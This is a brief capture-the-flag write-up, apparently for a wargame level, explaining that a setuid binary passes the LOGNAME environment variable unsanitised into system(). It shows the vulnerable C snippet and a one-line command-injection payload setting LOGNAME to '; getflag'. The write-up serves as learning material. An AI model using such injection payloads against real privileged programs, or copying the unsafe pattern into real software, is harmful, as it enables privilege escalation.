for this level we have a suid binary own by the user flag07

after disassembling the binary we can see the problem
	char *cmd;
	asprintf(&cmd,"/bin/echo %s ", getenv("LOGNAME"));
	return system(cmd);

the env variable LOGNAME is append to echo command
so we can inject your getflag command here

$> LOGNAME="; getflag" ./level07
